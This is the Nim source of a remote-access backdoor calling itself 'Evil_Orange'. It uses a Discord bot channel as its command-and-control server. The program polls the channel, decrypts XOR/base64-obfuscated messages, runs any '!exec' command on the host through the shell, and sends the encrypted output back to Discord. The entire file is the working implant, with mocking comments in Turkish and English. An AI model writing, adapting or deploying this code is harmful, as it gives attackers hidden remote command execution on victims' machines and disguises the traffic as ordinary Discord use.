import std/[httpclient, json, os, osproc, strutils, base64]
#Hi. Welcome to Evil_Orange. I hope the code will work. have a nice day and please support
let BOT_TOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
let CHANNEL_ID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
# ŞİMDİ LANET OLASI ANAHTARI HAZIRLIYORUZ EVET VODKA . 
let VODKAHEX =  getEnv("VODKA")
if VODKAHEX.len == 0:
  quit("VODKA  8 ERROR . HOW CAN İTS POSİBLE İDEOT ????")
if VODKAHEX.len != 64:
  quit("VODKA İS 64 HEX İDEOT ARE YOU MOST STUPİD THİNG İN THE UNİVERSE . ERROR 10.")
var VODKA_KEY: array[32, byte]
for i in 0..<32:
  VODKA_KEY[i] = parseHexInt(VODKAHEX[i*2 .. i*2+1]).byte
  # ı gona duck XOR okey?
proc xorEncrypt(key: array[32, byte], data: string): string=
  var result = ""
  for i in 0..<data.len:
    result.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return encode(result) #absulute its base64 .
proc xorDecrypt(key: array[32, byte], b64data: string): string =
  let data = decode(b64data)
  var result = ""
  for i in 0..<data.len:
    result.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return result
    
  # HERE İS DUCKİNG DİSCORD
var lastmessageID = ""
proc send_discord_message(client: HttpClient, content: string)=
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
  client.headers = newHttpHeaders({
    "Authorization": "Bot " & BOT_TOKEN,
    "Content-Type": "application/json"
  })
 #yeah its discord ...... eehh its not bad ?
  let encrypted = xorEncrypt(VODKA_KEY, content)
  let safe_content = if encrypted.len > 1900: encrypted[0..1900] & "\n.. [ehh finished]" else: encrypted
  let body = %*{"content": "```\n" & safe_content & "\n```"}
  try:
    discard client.postContent(url, $body)
  except Exception as e: 
    echo "ERROR NUMBER : 18", e.msg
proc poll_commands() =
  let client = newHTTPclient()
  client.headers = newHTTPheaders({"Authorization": "Bot " & BOT_TOKEN})
 # echo "holy sh!t error: 22", e.msg 
  while true:
    try:
      let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages?limit=1"
      let response = client.getContent(url)
      let jsonResponse = parseJson(response)
      if jsonResponse.len > 0:
        let msg = jsonResponse[0]
        let msgID = msg["id"].getStr()
        let content = msg["content"].getStr()
        #let author = msg["author"]["username"].getStr()
        # tekrar gönderme sorunu çözeceğiz burda
        if msgID != lastmessageID and not content.startsWith("```"):
          lastmessageID = msgID
          var decrypted = content
          #if content.len > 0 and not content.startsWith("!"):   
            try:
              decrypted = xorDecrypt(VODKA_KEY, content)
            except:
              decrypted = content
          if decrypted.startsWith("!exec ") and decrypted.len >= 7:  # 
            let command = decrypted[6..^1]
            echo "[*] its working yehuuuu!", command
            let (output, exitCode) = execCmdEx(command)
            send_discord_message(client, output)
    except Exception as e: 
      echo "error 42 . HOW YOU CAN MAKE İT ? ", e.msg 
      #rate limit
    sleep(3000)
when isMainModule:
  poll_commands()
